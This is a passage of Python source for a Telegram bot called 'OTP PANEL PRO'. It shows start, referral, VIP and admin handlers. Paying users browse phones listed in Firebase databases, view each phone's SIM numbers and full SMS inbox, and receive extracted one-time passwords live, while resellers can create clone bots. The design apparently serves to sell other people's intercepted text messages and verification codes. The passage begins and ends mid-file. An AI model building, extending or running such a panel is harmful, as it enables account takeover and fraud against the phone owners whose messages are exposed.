async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    user = update.effective_user
    bot_token = ctx.bot.token
    is_main_bot = (bot_token == TOKEN)

    if not is_main_bot:
        if bot_token not in CLONES:
            return
        if time.time() > CLONES[bot_token]["expiry"]:
            await update.message.reply_text("Aapka premium khatam ho gaya, isliye aapka bot off kiya humne.")
            return
        users_db = CLONES[bot_token]["users"]
        is_admin = (chat_id == CLONES[bot_token]["creator"])
    else:
        users_db = all_users
        is_admin = (chat_id in ADMIN_IDS)

    user_focus.setdefault(bot_token, {}).pop(chat_id, None)

    if users_db.get(chat_id, {}).get("banned"):
        await update.message.reply_text("🚫 You are banned from using this bot.")
        return

    ref_id = None
    if ctx.args and ctx.args.isdigit():
        ref_id = int(ctx.args)

    if chat_id not in users_db:
        users_db[chat_id] = {
            "name": user.full_name if user else "Unknown",
            "username": user.username or "" if user else "",
            "joined_at": datetime.now().strftime("%d %b %Y %I:%M %p"),
            "verified": False, "referrals": 0, "coins": 0,
            "vip_until": 0.0, "otp_count": 0, "bots_created": 0,
            "bonus_10_received": False,
            "referred_by": ref_id if ref_id != chat_id else None,
            "banned": False
        }
        if is_main_bot and ref_id and ref_id in users_db and ref_id != chat_id:
            users_db[ref_id]["referrals"] += 1
            users_db[ref_id]["coins"] += 10
            try:
                await ctx.bot.send_message(ref_id, "🎉 You have a new referral! +10 Coins added.")
            except: pass

    await send_bonus_if_applicable(ctx, chat_id, users_db, is_main_bot)

    if not users_db[chat_id].get("verified"):
        await send_join_prompt(update, is_main_bot)
        return

    chats_registry.setdefault(bot_token, set()).add(chat_id)
    text = (f"✨ <b>OTP PANEL PRO EDITION</b> ✨\n━━━━━━━━━━━━━━━━━━\n"
            f"Welcome, {user.first_name}!\nSystem is connected and fully operational.\n"
            f"Use the menu at the bottom of your screen to navigate.")
    await update.message.reply_text(text, parse_mode="HTML", reply_markup=get_clean_main_menu(is_admin))

async def cmd_points(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    bot_token = ctx.bot.token
    is_main_bot = (bot_token == TOKEN)
    users_db = all_users if is_main_bot else CLONES.get(bot_token, {}).get("users", {})
    coins = users_db.get(chat_id, {}).get("coins", 0)
    await update.message.reply_text(f"💰 Aapke paas {coins} Coins hain.")

async def cmd_referral(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    ref_link = f"https://t.me/{BOT_USERNAME}?start={chat_id}"
    await update.message.reply_text(
        f"💸 <b>Your Referral Link</b>\n\n<code>{ref_link}</code>\n\n"
        f"1 Refer = +10 Coins 🎁",
        parse_mode="HTML", disable_web_page_preview=True)

async def cmd_cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    if chat_id in pending_action:
        pending_action.pop(chat_id)
        await update.message.reply_text("✅ Action cancelled.")
    else:
        await update.message.reply_text("ℹ️ No pending action.")

async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    bot_token = ctx.bot.token
    is_main_bot = (bot_token == TOKEN)
    is_admin = (chat_id in ADMIN_IDS) if is_main_bot else (chat_id == CLONES.get(bot_token, {}).get("creator"))
    if not is_admin:
        await update.message.reply_text("ℹ️ Ye command sirf admin ke liye hai.")
        return
    await handle_admin_command(update, ctx, "/help", chat_id, is_main_bot)

async def cmd_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    bot_token = ctx.bot.token
    is_main_bot = (bot_token == TOKEN)
    is_admin = (chat_id in ADMIN_IDS) if is_main_bot else (chat_id == CLONES.get(bot_token, {}).get("creator"))
    if not is_admin:
        await update.message.reply_text("ℹ️ Ye command sirf admin ke liye hai.")
        return
    await handle_admin_command(update, ctx, "/stats", chat_id, is_main_bot)

# ─── CATCH-ALL COMMAND ROUTER ───────────────────────────────

async def on_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not update.message or not update.message.text:
        return
    chat_id = update.effective_chat.id
    text = update.message.text.strip()
    bot_token = ctx.bot.token
    is_main_bot = (bot_token == TOKEN)

    if not is_main_bot:
        if bot_token not in CLONES:
            return
        if time.time() > CLONES[bot_token].get("expiry", 0):
            return
        users_db = CLONES[bot_token]["users"]
        is_admin = (chat_id == CLONES[bot_token].get("creator"))
    else:
        users_db = all_users
        is_admin = (chat_id in ADMIN_IDS)

    if users_db.get(chat_id, {}).get("banned"):
        return

    if not is_admin:
        return

    await send_bonus_if_applicable(ctx, chat_id, users_db, is_main_bot)

    try:
        handled = await handle_admin_command(update, ctx, text, chat_id, is_main_bot)
        if not handled:
            await update.message.reply_text(
                "❓ Unknown command.\nType /help to see all admin commands.")
    except Exception as e:
        tlog(f"❌ on_command error: {e}")
        try:
            await update.message.reply_text(f"⚠️ Command error: {str(e)[:200]}")
        except: pass

async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    data = query.data or ""
    chat_id = query.message.chat_id
    bot_token = ctx.bot.token
    is_main_bot = (bot_token == TOKEN)

    if not is_main_bot:
        if bot_token not in CLONES:
            await query.answer("Bot disabled.", show_alert=True)
            return
        if time.time() > CLONES[bot_token]["expiry"]:
            await query.answer("Premium Expired.", show_alert=True)
            return
        users_db = CLONES[bot_token]["users"]
        is_admin = (chat_id == CLONES[bot_token]["creator"])
    else:
        users_db = all_users
        is_admin = (chat_id in ADMIN_IDS)

    if users_db.get(chat_id, {}).get("banned"):
        await query.answer("🚫 You are banned from using this bot.", show_alert=True)
        return

    if is_spamming(chat_id):
        await query.answer("⚠️ Please slow down! Do not spam buttons.", show_alert=True)
        return

    await query.answer()

    try:
        if data == "noop": return
        if data == "close_msg":
            try: await query.message.delete()
            except: pass
            return

        if data == "check_join":
            if is_main_bot:
                not_joined = await check_membership(bot_token, ctx.bot, chat_id)
                if not_joined:
                    names = ", ".join(f"@{u}" for u in not_joined)
                    await query.answer(
                        f"❌ Aapne abhi tak join nahi kiya:\n{names}\n\n"
                        f"Pehle channel join karein, phir 'Check Now' dabayein.",
                        show_alert=True)
                    return
            users_db.setdefault(chat_id, {})["verified"] = True
            chats_registry.setdefault(bot_token, set()).add(chat_id)
            try: await query.message.delete()
            except: pass
            try:
                await ctx.bot.send_message(
                    chat_id,
                    "✅ <b>Verification Successful!</b>\n"
                    "━━━━━━━━━━━━━━━━━━\n"
                    "Welcome to the bot! Ab aap saare features use kar sakte hain.\n\n"
                    "Menu neeche diya gaya hai 👇",
                    parse_mode="HTML",
                    reply_markup=get_clean_main_menu(is_admin))
            except Exception as e:
                tlog(f"Failed to send welcome: {e}")
            return

        if data == "buy_vip" and is_main_bot:
            if users_db.get(chat_id, {}).get("coins", 0) >= 20:
                users_db[chat_id]["coins"] -= 20
                current_vip = users_db[chat_id].get("vip_until", 0.0)
                users_db[chat_id]["vip_until"] = max(time.time(), current_vip) + (10 * 3600)
                await safe_edit(query, "✅ <b>VIP Purchased Successfully!</b>\n\n10 hours of premium access added. Click 'Devices List' below to start.", parse_mode="HTML")
            else:
                await safe_edit(query, "❌ <b>Not enough coins.</b>\nYou need 20 coins to buy VIP.", parse_mode="HTML")
            return

        if data == "create_bot" and is_main_bot:
            bots_created = users_db.get(chat_id, {}).get("bots_created", 0)
            req_bot_coins = 20 + (bots_created * 10)
            pending_action[chat_id] = {"action": "create_bot", "req_coins": req_bot_coins}
            await safe_edit(query,
                f"🤖 <b>CREATE YOUR CLONE BOT</b>\n━━━━━━━━━━━━━━━━━━\n"
                f"Cost: {req_bot_coins} coins\n\nSend bot token from @BotFather below:\n\n❌ Cancel: /cancel",
                parse_mode="HTML")
            return

        if data == "admin_refresh" and is_admin:
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            await safe_edit(query, admin_panel_text(bot_token), reply_markup=admin_keyboard(bot_token))
            return

        if data == "admin_add_firebase" and is_admin and is_main_bot:
            pending_action[chat_id] = {"action": "add_firebase_main"}
            await safe_edit(query,
                "🔗 ADD FIREBASE DATABASE\n━━━━━━━━━━━━━━━━━━\nNaya Firebase URL add karein.\n\n"
                "Format: <code>Name: URL</code>\nExample: <code>MyDB: https://mydb-default-rtdb.firebaseio.com</code>\n\n"
                "Ya sirf URL bhejein (auto name generate hoga).\n\n❌ Cancel: /cancel",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="admin_refresh")]]))
            return

        if data == "add_custom_db" and not is_main_bot and is_admin:
            pending_action[chat_id] = {"action": "add_custom_db", "clone_token": bot_token}
            await safe_edit(query,
                "🔗 ADD CUSTOM FIREBASE\n━━━━━━━━━━━━━━━━━━\nApna Firebase URL bhejein:\n"
                "(Example: https://your-panel-default-rtdb.firebaseio.com)\n\n❌ Cancel: /cancel",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="admin_refresh")]]))
            return

        if data == "admin_users" and is_admin:
            if not users_db:
                await query.answer("No users found.", show_alert=True)
                return
            lines = ["👥 User List (Top 50)\n━━━━━━━━━━━━━━━━━━\n"]
            for i, (uid, info) in enumerate(list(users_db.items())[:50], 1):
                icon = "🚫" if info.get("banned") else ("✅" if info.get("verified") else "⏳")
                lines.append(f"{i}. {icon} {user_display(info)}\n   ID: <code>{uid}</code> | OTPs: {info.get('otp_count', 0)}")
            text = "\n".join(lines)
            if len(text) > 4000: text = text[:4000] + "\n\n...[more users]"
            text += "\n\nTip: To ban someone type /ban ID"
            await safe_edit(query, text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_refresh")]]))
            return

        if data == "admin_broadcast" and is_admin:
            pending_action[chat_id] = {"action": "broadcast_msg"}
            await safe_edit(query,
                "📢 BROADCAST MESSAGE\n━━━━━━━━━━━━━━━━━━\nType the message you want to broadcast below:\n\n❌ Cancel: /cancel",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="admin_refresh")]]))
            return

        if data == "admin_gift_coins" and is_admin:
            pending_action[chat_id] = {"action": "gift_coins_all"}
            await safe_edit(query,
                "🎁 GIFT COINS TO ALL USERS\n━━━━━━━━━━━━━━━━━━\nKitne coins sabko send karne hain? Number type karein (Jaise: 50, 100):\n\n❌ Cancel: /cancel",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="admin_refresh")]]))
            return

        if data == "home":
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            pending_action.pop(chat_id, None)
            if not is_vip(bot_token, chat_id):
                bots_created = users_db.get(chat_id, {}).get("bots_created", 0)
                req_bot_coins = 20 + (bots_created * 10)
                await safe_edit(query,
                    "🚫 <b>VIP Access Required!</b>\n━━━━━━━━━━━━━━━━━━\nAapke paas VIP access nahi hai. "
                    "Niche diye gaye button se apna referral link share karein aur doston ko invite karke coins kamayein!",
                    reply_markup=get_vip_denied_keyboard(chat_id, req_bot_coins) if is_main_bot else InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
                return
            devices = await get_all_devices(bot_token)
            await safe_edit(query, device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0), parse_mode="HTML")
            return

        if data.startswith("pg:"):
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            if not is_vip(bot_token, chat_id): return
            page = int(data[3:])
            devices = await get_all_devices(bot_token)
            await safe_edit(query, device_list_header(devices, page), reply_markup=device_list_keyboard(devices, page), parse_mode="HTML")
            return

        if data == "online":
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            if not is_vip(bot_token, chat_id): return
            devices = await get_all_devices(bot_token)
            online = [d for d in devices if d.status == "online"]
            await safe_edit(query, f"🟢 <b>ONLINE NUMBERS ({len(online)})</b>\n━━━━━━━━━━━━━━━━━━\nClick a number to connect:",
                            reply_markup=online_only_keyboard(devices), parse_mode="HTML")
            return

        devices = await get_all_devices(bot_token)

        if data.startswith("sel:"):
            if not is_vip(bot_token, chat_id): return
            dev_id = data[4:]
            device = next((d for d in devices if d.id == dev_id), None)
            if not device:
                await query.answer("❌ Device not found!", show_alert=True)
                return
            user_focus.setdefault(bot_token, {})[chat_id] = dev_id
            label = device_label(device)
            status = "🟢 Online" if device.status == "online" else "🔴 Offline"
            bat = f"{bat_emoji(device.battery)} {device.battery}%"
            text = (f"📱 <b>CONNECTED TO DEVICE</b>\n━━━━━━━━━━━━━━━━━━\n"
                    f"Number  : {label}\nStatus  : {status}\nBattery : {bat}\n"
                    f"Server  : {device.db_tag}\n━━━━━━━━━━━━━━━━━━\n"
                    f"⚠️ You are now receiving LIVE OTPs for this number. Click 'Disconnect' to stop.")
            await safe_edit(query, text, reply_markup=device_action_keyboard(dev_id), parse_mode="HTML")
            return

        if data.startswith("msgs:"):
            if not is_vip(bot_token, chat_id): return
            dev_id = data[5:]
            device = next((d for d in devices if d.id == dev_id), None)
            if not device:
                await query.answer("❌ Device not found!", show_alert=True)
                return
            user_focus.setdefault(bot_token, {})[chat_id] = dev_id
            label = device_label(device)
            smss = await get_device_sms(device)
            if not smss:
                await safe_edit(query, f"📭 {label}\n\nNo SMS found.",
                                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data=f"sel:{dev_id}")]]))
                return
            
            body_parts = []
            has_otp = False
            for sms in smss:
                body = sms.get("body") or sms.get("message") or sms.get("text") or ""
                otp = extract_otp(body)
                date = sms_date(sms)
                sender = sms.get("sender") or "?"
                
                if otp:
                    has_otp = True
                    body_parts.append(f"🔑 <b>OTP:</b> <code>{otp}</code>\n👤 {sender} | 📅 {date}\n💬 {body}")
                else:
                    body_parts.append(f"📩 {sender} | 📅 {date}\n💬 {body}")

            if has_otp:
                users_db.setdefault(chat_id, {})["otp_count"] = users_db.get(chat_id, {}).get("otp_count", 0) + 1
            
            header = (f"📩 <b>MESSAGES LOG</b>\n━━━━━━━━━━━━━━━━━━\nNumber: {label}\n"
                      f"Showing: {len(smss)} messages\n━━━━━━━━━━━━━━━━━━\n\n")
            
            full_text = header + ("\n━━━━━━━━━\n").join(body_parts)
            if len(full_text) > 4000: full_text = full_text[:4000] + "\n\n...[more SMS available]"
            
            kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Device", callback_data=f"sel:{dev_id}")]])
            await safe_edit(query, full_text, reply_markup=kb, parse_mode="HTML")
            return

        if data.startswith("info:"):
            if not is_vip(bot_token, chat_id): return
            dev_id = data[5:]
            device = next((d for d in devices if d.id == dev_id), None)
            if not device:
                await query.answer("❌ Device not found!", show_alert=True)
                return
            user_focus.setdefault(bot_token, {})[chat_id] = dev_id
            label = device_label(device)
            status = "🟢 Online" if device.status == "online" else "🔴 Offline"
            bat = f"{bat_emoji(device.battery)} {device.battery}%"
            text = (f"ℹ️ <b>DEVICE DETAILS</b>\n━━━━━━━━━━━━━━━━━━\nNumber  : {label}\nStatus  : {status}\n"
                    f"Battery : {bat}\nServer  : {device.db_tag}\n")
            for i, num in enumerate(device.numbers, 1):
                text += f"SIM {i}   : <code>{num}</code>\n"
            if device.device_info:
                text += f"\n{device.device_info}\n"
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("📩 View Messages", callback_data=f"msgs:{dev_id}"),
                 InlineKeyboardButton("ℹ️ Back", callback_data=f"sel:{dev_id}")],
                [InlineKeyboardButton("🔙 Disconnect & Back", callback_data="home")],
            ])
            await safe_edit(query, text, reply_markup=kb, parse_mode="HTML")
            return

    except Exception as e:
        tlog(f"❌ Callback error [{data}]: {e}")
        try: await query.message.reply_text("⚠️ An error occurred, please try again.")
        except: pass

# ════════════════════════════════════════════════════════════
#  UNIVERSAL ADMIN COMMAND HANDLER
# ════════════════════════════════════════════════════════════

async def handle_admin_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE,
                                text: str, chat_id: int, is_main_bot: bool) -> bool:
    parts = text.strip().split(maxsplit=2)
    cmd = parts[0].lower().split("@")[0]
    args = parts[1:] if len(parts) > 1 else []

    users_db = all_users if is_main_bot else CLONES[ctx.bot.token]["users"]
    bot_token = ctx.bot.token

    if cmd == "/help":
        help_text = (
            "🛡 <b>ADMIN COMMANDS</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "<b>💰 Coin Management</b>\n"
            "• <code>/all 50</code> — Give 50 coins to ALL users\n"
            "• <code>/give USER_ID 100</code> — Give coins to one user\n"
            "• <code>/take USER_ID 50</code> — Take coins from one user\n"
            "• <code>/reset USER_ID</code> — Reset user's coins to 0\n"
            "• <code>/resetall</code> — Reset ALL users' coins\n"
            "• <code>/setcoin USER_ID 500</code> — Set exact coin value\n\n"
            "<b>👑 VIP Management</b>\n"
            "• <code>/vip USER_ID 24</code> — Grant 24h VIP\n"
            "• <code>/unvip USER_ID</code> — Remove VIP\n"
            "• <code>/vipall 12</code> — Grant VIP to all users\n"
            "• <code>/vipinfo USER_ID</code> — Check VIP status\n\n"
            "<b>👥 User Management</b>\n"
            "• <code>/ban USER_ID</code> — Ban user\n"
            "• <code>/unban USER_ID</code> — Unban user\n"
            "• <code>/userinfo USER_ID</code> — Full user info\n"
            "• <code>/stats</code> — Bot statistics\n"
            "• <code>/top</code> — Top 10 users by OTPs\n\n"
            "<b>📢 Messaging</b>\n"
            "• <code>/broadcast MESSAGE</code> — Send to all users\n"
            "• <code>/msg USER_ID MESSAGE</code> — Send to one user\n\n"
            "<b>🗄 Database Management</b>\n"
            "• <code>/adddb Name https://...firebaseio.com</code>\n"
            "• <code>/listdb</code> — List all databases\n"
            "• <code>/count</code> — Count devices across DBs\n\n"
            "<b>🤖 Clone Bot Management</b>\n"
            "• <code>/clones</code> — List all active clone bots\n"
            "• <code>/kill TOKEN</code> — Stop a clone bot\n"
        )
        await update.message.reply_text(help_text, parse_mode="HTML")
        return True

    # ── /all N ─────────────────────────────────────────────
    if cmd == "/all":
        if not args or not args[0].isdigit():
            await update.message.reply_text("⚠️ Usage: <code>/all 50</code>", parse_mode="HTML")
            return True
        amount = int(args[0])
        if amount <= 0:
            await update.message.reply_text("⚠️ Amount 0 se zyada honi chahiye.")
            return True
        wait = await update.message.reply_text(f"⏳ {len(users_db)} users ko {amount} coins bheje ja rahe hain...")
        app_to_use = _main_app if is_main_bot else CLONES[bot_token].get("app")
        if not app_to_use:
            await wait.edit_text("❌ Bot app not available.")
            return True

        async def give_one(uid):
            users_db[uid]["coins"] = users_db[uid].get("coins", 0) + amount
            try:
                await app_to_use.bot.send_message(
                    uid,
                    f"🎁 <b>GIFT FROM ADMIN!</b> 🎁\n\nAapko <b>{amount} Coins</b> mil gaye hain!\n"
                    f"Naya balance: <b>{users_db[uid]['coins']}</b>", parse_mode="HTML")
                return True
            except: return False

        results = await asyncio.gather(*(give_one(u) for u in list(users_db.keys())), return_exceptions=True)
        sent = sum(1 for r in results if r is True)
        failed = len(users_db) - sent
        await wait.edit_text(
            f"✅ <b>BULK GIFT SUCCESS!</b>\n━━━━━━━━━━━━━━━━━━\n"
            f"💰 Coins each: {amount}\n✅ Sent: {sent}\n❌ Failed: {failed}\n👥 Total: {len(users_db)}",
            parse_mode="HTML")
        return True

    # ── /give USER_ID N ────────────────────────────────────
    if cmd == "/give":
        if len(args) < 2 or not args[0].lstrip("-").isdigit() or not args[1].isdigit():
            await update.message.reply_text("⚠️ Usage: <code>/give USER_ID AMOUNT</code>", parse_mode="HTML")
            return True
        uid, amount = int(args[0]), int(args[1])
        if uid not in users_db:
            await update.message.reply_text(f"❌ User <code>{uid}</code> not found.", parse_mode="HTML")
            return True
        if amount <= 0:
            await update.message.reply_text("⚠️ Amount > 0.")
            return True
        users_db[uid]["coins"] = users_db[uid].get("coins", 0) + amount
        app_to_use = _main_app if is_main_bot else CLONES[bot_token].get("app")
        try:
            await app_to_use.bot.send_message(
                uid,
                f"🎁 <b>GIFT FROM ADMIN!</b> 🎁\n\nAapko <b>{amount} Coins</b> mil gaye hain!\n"
                f"Naya balance: <b>{users_db[uid]['coins']}</b>", parse_mode="HTML")
            delivered = "✅ Delivered"
        except: delivered = "⚠️ Not delivered"
        await update.message.reply_text(
            f"✅ <b>COINS GIVEN</b>\n👤 <code>{uid}</code>\n💰 {amount}\n"
            f"💎 New: {users_db[uid]['coins']}\n📨 {delivered}",
            parse_mode="HTML")
        return True

    # ── /take USER_ID N ────────────────────────────────────
    if cmd == "/take":
        if len(args) < 2 or not args[0].isdigit() or not args[1].isdigit():
            await update.message.reply_text("⚠️ Usage: <code>/take USER_ID AMOUNT</code>", parse_mode="HTML")
            return True
        uid, amount = int(args[0]), int(args[1])
        if uid not in users_db:
            await update.message.reply_text("❌ User not found.")
            return True
        old = users_db[uid].get("coins", 0)
        users_db[uid]["coins"] = max(0, old - amount)
        await update.message.reply_text(
            f"✅ <code>{uid}</code>: {old} → {users_db[uid]['coins']}", parse_mode="HTML")
        return True

    # ── /reset USER_ID ─────────────────────────────────────
    if cmd == "/reset":
        if not args or not args[0].isdigit():
            await update.message.reply_text("⚠️ Usage: <code>/reset USER_ID</code>", parse_mode="HTML")
            return True
        uid = int(args[0])
        if uid not in users_db:
            await update.message.reply_text("❌ User not found.")
            return True
        old = users_db[uid].get("coins", 0)
        users_db[uid]["coins"] = 0
        await update.message.reply_text(f"✅ Reset: {old} → 0", parse_mode="HTML")
        return True

    # ── /resetall ──────────────────────────────────────────
    if cmd == "/resetall":
        count = 0
        for uid in users_db:
            if users_db[uid].get("coins", 0) > 0:
                users_db[uid]["coins"] = 0
                count += 1
        await update.message.reply_text(f"✅ <b>ALL RESET</b>\n👥 {count} affected.", parse_mode="HTML")
        return True

    # ── /setcoin USER_ID N ─────────────────────────────────
    if cmd == "/setcoin":
        if len(args) < 2 or not args[0].isdigit() or not args[1].isdigit():
            await update.message.reply_text("⚠️ Usage: <code>/setcoin USER_ID VALUE</code>", parse_mode="HTML")
            return True
        uid, val = int(args[0]), int(args[1])
        if uid not in users_db:
            await update.message.reply_text("❌ User not found.")
            return True
        old = users_db[uid].get("coins", 0)
        users_db[uid]["coins"] = val
        await update.message.reply_text(f"✅ <code>{uid}</code>: {old} → {val}", parse_mode="HTML")
        return True

    # ── /vip USER_ID HOURS ─────────────────────────────────
    if cmd == "/vip":
        if len(args) < 2 or not args[0].isdigit() or not args[1].isdigit():
            await update.message.reply_text("⚠️ Usage: <code>/vip USER_ID HOURS</code>", parse_mode="HTML")
            return True
        uid, hours = int(args[0]), int(args[1])
        if uid not in users_db:
            await update.message.reply_text("❌ User not found.")
            return True
        if hours <= 0:
            await update.message.reply_text("⚠️ Hours > 0.")
            return True
        current = users_db[uid].get("vip_until", 0.0)
        users_db[uid]["vip_until"] = max(time.time(), current) + hours * 3600
        app_to_use = _main_app if is_main_bot else CLONES[bot_token].get("app")
        try:
            await app_to_use.bot.send_message(uid,
                f"👑 <b>VIP GRANTED!</b>\n\nAdmin ne aapko <b>{hours}h VIP</b> diya hai!",
                parse_mode="HTML")
        except: pass
        await update.message.reply_text(f"✅ VIP {hours}h to <code>{uid}</code>", parse_mode="HTML")
        return True

    # ── /unvip USER_ID ─────────────────────────────────────
    if cmd == "/unvip":
        if not args or not args[0].isdigit():
            await update.message.reply_text("⚠️ Usage: <code>/unvip USER_ID</code>", parse_mode="HTML")
            return True
        uid = int(args[0])
        if uid not in users_db:
            await update.message.reply_text("❌ User not found.")
            return True
        users_db[uid]["vip_until"] = 0.0
        await update.message.reply_text(f"✅ VIP removed from <code>{uid}</code>", parse_mode="HTML")
        return True

    # ── /vipall HOURS ──────────────────────────────────────
    if cmd == "/vipall":
        if not args or not args[0].isdigit():
            await update.message.reply_text("⚠️ Usage: <code>/vipall HOURS</code>", parse_mode="HTML")
            return True
        hours = int(args[0])
        if hours <= 0:
            await update.message.reply_text("⚠️ Hours > 0.")
            return True
        app_to_use = _main_app if is_main_bot else CLONES[bot_token].get("app")
        wait = await update.message.reply_text(f"⏳ Granting {hours}h VIP to all...")

        async def give_vip(uid):
            current = users_db[uid].get("vip_until", 0.0)
            users_db[uid]["vip_until"] = max(time.time(), current) + hours * 3600
            try:
                await app_to_use.bot.send_message(uid,
                    f"👑 <b>VIP GIFTED!</b>\n\n<b>{hours}h VIP</b> free! 🎉",
                    parse_mode="HTML")
                return True
            except: return False

        results = await asyncio.gather(*(give_vip(u) for u in list(users_db.keys())), return_exceptions=True)
        sent = sum(1 for r in results if r is True)
        await wait.edit_text(f"✅ VIP sent to {sent}/{len(users_db)}.", parse_mode="HTML")
        return True

    # ── /vipinfo USER_ID ───────────────────────────────────
    if cmd == "/vipinfo":
        if not args or not args[0].isdigit():
            await update.message.reply_text("⚠️ Usage: <code>/vipinfo USER_ID</code>", parse_mode="HTML")
            return True
        uid = int(args[0])
        if uid not in users_db:
            await update.message.reply_text("❌ User not found.")
            return True
        info = users_db[uid]
        left = info.get("vip_until", 0.0) - time.time()
        status = "❌ Not VIP" if left <= 0 else f"✅ {get_vip_time_left(bot_token, uid)}"
        await update.message.reply_text(
            f"👑 <b>VIP STATUS</b>\n👤 <code>{uid}</code>\n📛 {info.get('name','Unknown')}\n⏱ {status}",
            parse_mode="HTML")
        return True

    # ── /ban USER_ID ───────────────────────────────────────
    if cmd == "/ban":
        if not args or not args[0].lstrip("-").isdigit():
            await update.message.reply_text("⚠️ Usage: <code>/ban USER_ID</code>", parse_mode="HTML")
            return True
        uid = int(args[0])
        if uid not in users_db:
            await update.message.reply_text(f"❌ User <code>{uid}</code> not found.", parse_mode="HTML")
            return True
        users_db[uid]["banned"] = True
        user_focus.setdefault(bot_token, {}).pop(uid, None)
        await update.message.reply_text(f"✅ Banned <code>{uid}</code>.", parse_mode="HTML")
        return True

    # ── /unban USER_ID ─────────────────────────────────────
    if cmd == "/unban":
        if not args or not args[0].lstrip("-").isdigit():
            await update.message.reply_text("⚠️ Usage: <code>/unban USER_ID</code>", parse_mode="HTML")
            return True
        uid = int(args[0])
        if uid not in users_db:
            await update.message.reply_text(f"❌ User <code>{uid}</code> not found.", parse_mode="HTML")
            return True
        users_db[uid]["banned"] = False
        await update.message.reply_text(f"✅ Unbanned <code>{uid}</code>.", parse_mode="HTML")
        return True

    # ── /userinfo USER_ID ──────────────────────────────────
    if cmd == "/userinfo":
        if not args or not args[0].isdigit():
            await update.message.reply_text("⚠️ Usage: <code>/userinfo USER_ID</code>", parse_mode="HTML")
            return True
        uid = int(args[0])
        if uid not in users_db:
            await update.message.reply_text(f"❌ User <code>{uid}</code> not found.", parse_mode="HTML")
            return True
        info = users_db[uid]
        vip_left = info.get("vip_until", 0.0) - time.time()
        vip_status = "❌ Not VIP" if vip_left <= 0 else f"✅ {get_vip_time_left(bot_token, uid)}"
        await update.message.reply_text(
            f"👤 <b>USER INFO</b>\n━━━━━━━━━━━━━━━━━━\n"
            f"🆔 <code>{uid}</code>\n📛 {info.get('name','Unknown')}\n"
            f"🔗 @{info.get('username') or 'none'}\n📅 {info.get('joined_at','N/A')}\n"
            f"💰 Coins: {info.get('coins',0)}\n👥 Referrals: {info.get('referrals',0)}\n"
            f"📩 OTPs: {info.get('otp_count',0)}\n🤖 Bots: {info.get('bots_created',0)}\n"
            f"👑 VIP: {vip_status}\n"
            f"🔐 {'✅' if info.get('verified') else '⏳'}, {'🚫' if info.get('banned') else '✅ Active'}",
            parse_mode="HTML")
        return True

    # ── /stats ─────────────────────────────────────────────
    if cmd == "/stats":
        total_users = len(users_db)
        verified = sum(1 for u in users_db.values() if u.get("verified"))
        banned = sum(1 for u in users_db.values() if u.get("banned"))
        vip_users = sum(1 for u in users_db.values() if u.get("vip_until", 0) > time.time())
        total_coins = sum(u.get("coins", 0) for u in users_db.values())
        total_otps = sum(u.get("otp_count", 0) for u in users_db.values())
        total_refs = sum(u.get("referrals", 0) for u in users_db.values())
        total_devices = sum(len(v) for v in GLOBAL_DEVICE_CACHE.values())
        await update.message.reply_text(
            f"📊 <b>BOT STATISTICS</b>\n━━━━━━━━━━━━━━━━━━\n"
            f"👥 Users: {total_users}\n✅ Verified: {verified}\n🚫 Banned: {banned}\n"
            f"👑 VIPs: {vip_users}\n💰 Coins: {total_coins}\n"
            f"📩 OTPs: {total_otps}\n👥 Referrals: {total_refs}\n"
            f"📱 Devices: {total_devices}\n🗄 DBs: {len(DATABASES)}\n"
            f"🤖 Clones: {len(CLONES)}\n━━━━━━━━━━━━━━━━━━\n"
            f"🕐 {datetime.now().strftime('%d %b %Y %I:%M %p')}",
            parse_mode="HTML")
        return True

    # ── /top ───────────────────────────────────────────────
    if cmd == "/top":
        sorted_users = sorted(users_db.items(), key=lambda x: x[1].get("otp_count", 0), reverse=True)
        lines = ["🏆 <b>TOP 10 USERS</b>", "━━━━━━━━━━━━━━━━━━"]
        medals = ["🥇", "🥈", "🥉"] + ["🔸"] * 7
        for i, (uid, info) in enumerate(sorted_users[:10]):
            lines.append(f"{medals[i]} {i+1}. {info.get('name','Unknown')}\n"
                         f"    <code>{uid}</code> — {info.get('otp_count',0)} OTPs | 💰 {info.get('coins',0)}")
        await update.message.reply_text("\n".join(lines), parse_mode="HTML")
        return True

    # ── /broadcast MSG ─────────────────────────────────────
    if cmd == "/broadcast":
        if not args:
            await update.message.reply_text("⚠️ Usage: <code>/broadcast Your message</code>", parse_mode="HTML")
            return True
        msg = " ".join(args)
        targets = chats_registry.get(bot_token, set())
        if not targets:
            await update.message.reply_text("❌ No verified chats.")
            return True
        wait = await update.message.reply_text(f"⏳ Broadcasting to {len(targets)} users...")
        app_to_use = _main_app if is_main_bot else CLONES[bot_token].get("app")

        async def send_one(cid):
            if cid == chat_id: return False
            try:
                await app_to_use.bot.send_message(cid, msg, parse_mode="HTML")
                return True
            except: return False

